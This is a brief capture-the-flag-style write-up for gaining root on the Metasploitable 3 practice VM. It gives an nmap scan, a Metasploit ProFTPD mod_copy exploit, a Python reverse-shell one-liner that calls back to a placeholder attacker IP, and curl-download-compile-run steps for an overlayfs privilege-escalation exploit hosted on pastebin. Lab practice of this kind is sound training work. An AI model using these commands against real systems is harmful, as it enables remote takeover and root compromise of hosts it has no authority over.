# Metsploitable 3 Writeup

QUICKEST ROOT SHELL :)

## Recon

```bash
nmap -sV 192.168.100.231
```

## Exploitation

### ProFTPD

Using the following exploit:

```bash
use exploit unix/ftp/proftpd_modcopy/exec
```

Getting better shell:

```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKING-IP",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

Getting root shell:

1. Upload overlayfs_exploit.c to pastebin.com
2. Download on target system using wget or curl & save into file
3. GCC compile the C exploit and gain root shell

```bash
curl https://pastebin.com/raw/LTADWAas > over.c
gcc over.c -o over
./over
id
```

